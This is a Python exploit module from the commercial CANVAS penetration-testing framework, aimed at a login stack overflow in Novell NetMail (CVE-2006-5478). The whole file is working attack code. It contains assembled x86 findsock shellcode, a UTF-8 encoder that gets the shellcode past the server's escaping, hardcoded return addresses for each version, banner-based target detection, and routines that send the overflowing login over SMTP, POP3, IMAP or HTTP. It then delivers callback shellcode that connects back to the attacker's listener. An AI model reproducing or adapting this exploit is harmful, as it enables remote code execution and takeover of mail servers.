#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

import os
import getopt
import socket
import time
import base64
import random

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME = "Novell NetMail"
DESCRIPTION = "Novell NetMail Login Stack Overflow"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION["Date public"] = "10/31/06"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-06-036.html"
DOCUMENTATION["Repeatability"] = "One shot per service"
DOCUMENTATION["VersionsAffected"] = "Novell NetMail <= 3.5.2e-ftf1"
DOCUMENTATION["CVE Name"] = "CVE-2006-5478"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5478"
DOCUMENTATION['CVSS'] = 7.5


VERSION = "0.1"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003" ]

NOTES="""
The vulnerability is in fact located in a DLL common to all NetMail services.
Thus, are vulnerable to the overflow : SMTPd, POP3d, IMAPd, NMAPd, MODWEBd, ...
The execution path is :
Process thread -> MSGFindObject -> DDBGetObjectDetails -> [ Stack Overflow ]
'.' is replaced by '\.' without length checks in a fixed size stack buffer.
Other characters are escaped at some point : '+' '*' '=' '''.
The overflow happens when manipulating a unicode string, but the cool thing is
that it is read from a UTF-8 string, so we can fill it with whatever we want !
"""

CHANGELOG="""
"""

targets = {
    0 : [ "Autodetect (Limited to SMTP and POP3)", 0 ],
    1 : [ "Novell NetMail 3.5.2 on Windows 2000",  0 ],
    2 : [ "Novell NetMail 3.5.2 on Windows 2003 SP0", 0x002dcad4 ], # push esp & ret @ sortkey.nls
    3 : [ "Novell NetMail 3.5.2 on Windows 2003 SP1", 0x002ccad4 ], # push esp & ret @ sortkey.nls
            }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name = NAME
        self.host = ''
        self.port = 25
        self.version = 1
        self.badstring = ''
        self.ssl = 0
        self.eip = 0
        self.banner = ''
        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def connectToHost(self):
        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except socket.error, msg:
            self.raiseError("Could not connect to %s:%d" % (self.host, self.port))
        return s

    def test(self):
        return 0

    def createFindsockShellcode(self):
        """Creates a very small shellcode that reacts to a 4 byte tag sent on a socket"""
        findsockcode = """xorl   %eax,%eax
movb   $0x8,%ah
subl   %eax,%esp
cld
xorl   %edi,%edi
movl   %fs:0x30(%edi),%eax
movl   0xc(%eax),%eax
movl   0x1c(%eax),%ebx
searchWS2_32:
movl   (%ebx),%ebx
movl   0x20(%ebx),%esi
lodsl
lodsl
decl   %esi
addl   (%esi),%eax
cmpl   $0x325f3332,%eax
jne    searchWS2_32
movl   0x8(%ebx),%ebp
movl   0x3c(%ebp),%eax
movl   0x78(%ebp,%eax,1),%ecx
movl   0x1c(%ebp,%ecx,1),%ecx
movl   0x3c(%ecx,%ebp,1),%ebx
addl   %ebp,%ebx
addl   0x24(%ecx,%ebp,1),%ebp
pushl  %edi
searchSocket:
incw   %di
movl   %esp,%esi
pushl  %esi
pushl  $0x4004667f
pushl  %edi
call  *%ebp
lodsl
test  %eax,%eax
je     searchSocket
cltd
pushl  %edx
movb   $0xc,%dh
pushl  %edx
pushl  %esi
pushl  %edi
call  *%ebx
lodsl
cmpl   $0x2a2a2a2a,%eax
jne    searchSocket
jmp   *%esi"""
        findsockcode =  mosdef.assemble(findsockcode, "X86")
        return findsockcode

    def createShellcode(self):
        self.log('creating Win32 shellcode (callback: %s:%d)' % (self.callback.ip, self.callback.port))
        self.createWin32Shellcode(self.badstring, self.callback.ip, self.callback.port)
        return self.shellcode

    def encodeUTF8(self, string):
        """Dumb UTF-8 encoder: turns every 2 byte sequence in a 3 byte UTF-8 sequence"""
        buffer = ''
        if (len(string) % 2) == 1:
            string += '\x00'
        for i in range(0, len(string), 2):
            buffer += chr(0xe0 | (ord(string[i + 1]) >> 4))
            buffer += chr(0x80 | ((ord(string[i + 1]) & 0xf) << 2) | (ord(string[i]) >> 6))
            buffer += chr(0x80 | (ord(string[i]) & 0x3f))
        return buffer

    def buildLogin(self):
        """Builds the actual login string that triggers the stack overflow"""
        encodedshellcode = self.encodeUTF8(self.createFindsockShellcode())
        encodedretjump = self.encodeUTF8(intel_order(self.eip) + mosdef.assemble("jmp $-0xff", "X86"))
        login = '\\'
        login += encodedshellcode
        padsize = 128 - ((len(encodedshellcode) + len(encodedretjump)) / 3)
        for i in range(padsize):
            login += chr(0x61 + random.randint(0, 26))
        login += encodedretjump
        login += '\\'
        for i in range(117):
            login += chr(0x61 + random.randint(0, 26))
        for i in range(11):
            login += '.'
        return login

    def getReturnAddress(self):
        """Returns correct EIP"""
        address = 0
        if self.version == 0:
            # Novell people have really done crap with their banners ...
            if self.banner.find('NetMail POP3 Agent') != -1:
                # POP3 autoversioning will fail for v3.5.2.1 due to banner collision
                if self.banner.find('3.65') != -1:
                    address = 0x00428f0d # jmp esp @ pop3d.exe v3.5.2.0
                elif self.banner.find('1.1.1.1') != -1:
                    address = 0x00428dbd # jmp esp @ pop3d.exe v3.5.2.2
                elif self.banner.find('1.2') != -1:
                    address = 0x00428f6d # jmp esp @ pop3d.exe v3.5.2.3
                elif self.banner.find('1.6') != -1:
                    address = 0x00428fcd # jmp esp @ pop3d.exe v3.5.2.4, v3.5.2.5
            elif self.banner.find('Novonyx SMTP ready') != -1:
                # SMTP autoversioning will fail for 3.5.2.1 due to banner collision
                if self.banner.find('3.89') != -1:
                    address = 0x00438ddd # jmp esp @ smtpd.exe v3.5.2.0
                elif self.banner.find('1.1.1.1') != -1:
                    address = 0x00438c8d # jmp esp @ smtpd.exe v3.5.2.2
                elif self.banner.find('1.5') != -1:
                    address = 0x00438e7d # jmp esp @ smtpd.exe v3.5.2.3
                elif self.banner.find('1.6') != -1:
                    address = 0x00438e6d # jmp esp @ smtpd.exe v3.5.2.4, v3.5.2.5
        elif self.version == 1:
            if self.service.find('POP3') != -1:
                address = 0x1003267b # jump esp @ ddb.dll v3.5.2.0 to v3.5.2.5, when loaded by pop3d.exe
            else:
                address = 0x0026267b # jump esp @ ddb.dll v3.5.2.0 to v3.5.2.5, when loaded by smtpd.exe, imapd.exe, modwebd.exe
        if address == 0:
            self.log("%s attacking %s:%d - done (no return address found!)" % (NAME, self.host, self.port))
        return address

    def exploitMail(self, string):
        """Exploits mail related services: SMTP, POP3, IMAP"""
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.setProgress(33)
        s = self.connectToHost()
        self.banner = self.webrecv(s)
        print "Banner: " + self.banner,
        if self.eip == 0:
            self.eip = self.getReturnAddress()
        if self.eip == 0:
            return 0
        self.websend(s, string + '\r\n')
        self.webrecv(s)
        self.websend(s, base64.b64encode(self.buildLogin()) + '\r\n')
        self.webrecv(s)
        self.setProgress(66)
        self.websend(s, base64.b64encode('whatever') + '\r\n')
        s.sendall('****' + self.shellcode)
        time.sleep(3)
        s.close()
        self.setProgress(100)
        return 1

    def exploitWeb(self):
        """Exploits web based interface: MODWEB"""
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.setProgress(25)
        s = self.connectToHost()
        self.websend(s, 'GET / HTTP/1.1\r\nHost: ' + self.host + '\r\n\r\n')
        data = self.webrecv(s)
        s.close()
        self.setProgress(50)
        # Follow the white rabbit ...
        i = data.find('Location: ')
        data = data[i + 10:]
        i = data.find('\r\n')
        data = data[:i]
        print "Redirection: " + data
        if self.eip == 0:
            self.eip = self.getReturnAddress()
        if self.eip == 0:
            return 0
        s = self.connectToHost()
        data = 'GET ' + data + ' HTTP/1.1\r\nHost: ' + self.host + '\r\n'
        data += 'Authorization: Basic ' + base64.b64encode(self.buildLogin() + ':whatever') + '\r\n\r\n'
        self.setProgress(75)
        self.websend(s, data)
        s.sendall('****' + self.shellcode)
        time.sleep(5)
        s.close()
        self.setProgress(100)
        return 1

    def run(self):
        self.host = self.target.interface
        self.info, self.eip = targets[self.version]
        print self.info

        if "ssl" in self.argsDict and self.argsDict["ssl"]:
            print "Using SSL"
            self.ssl = 1

        self.service = ''
        if "service" in self.argsDict and self.argsDict["service"]:
            self.service = self.argsDict["service"]

        if self.service.find("SMTP") != -1:
            self.port = 25
            if self.ssl:
                self.port = 465
            self.exploitMail("AUTH LOGIN")
        elif self.service.find("POP3") != -1:
            self.port = 110
            if self.ssl:
                self.port = 995
            self.exploitMail("AUTH LOGIN")
        elif self.service.find("IMAP4") != -1:
            self.port = 143
            if self.ssl:
                self.port = 993
            if self.version == 0:
                self.setInfo("%s attacking %s:%d - done (no autoversioning for IMAP4!)" % (NAME, self.host, self.port))
                return 0
            self.exploitMail("x AUTHENTICATE LOGIN")
        elif self.service.find("HTTP") != -1:
            self.port = 80
            if self.ssl:
                self.port = 443
            if self.version == 0:
                self.setInfo("%s attacking %s:%d - done (no autoversioning for HTTP!)" % (NAME, self.host, self.port))
                return 0
            self.exploitWeb()
        else:
            self.log("No service specified")
            self.setInfo("%s attacking %s:%d - done (failed!)" % (NAME, self.host, self.port))
            return 0

        time.sleep(3)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
            self.log("%s done (succeeded!)" % self.name)
            return 1

        self.setInfo("%s attacking %s:%d - done (failed!)" % (NAME, self.host, self.port))
        self.log("%s attacking %s:%d - done (failed!)" % (NAME, self.host, self.port))
        return 0

    def displayVersions(self):
        i = 0
        print "Available versions:"
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i = i + 1

    def usage(self):
        # exploits/netmail/netmail.py -v 1 -t 10.10.11.21 -O ssl:1 -O service:IMAP4 -l 10.10.11.1 -d 12345
        print "Usage: %s -v version -t host [ -O ssl:1 ] -O service:SMTP|HTTP|POP3|IMAP4 -l localip -d localport\n" % sys.argv[0]
        self.displayVersions()

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
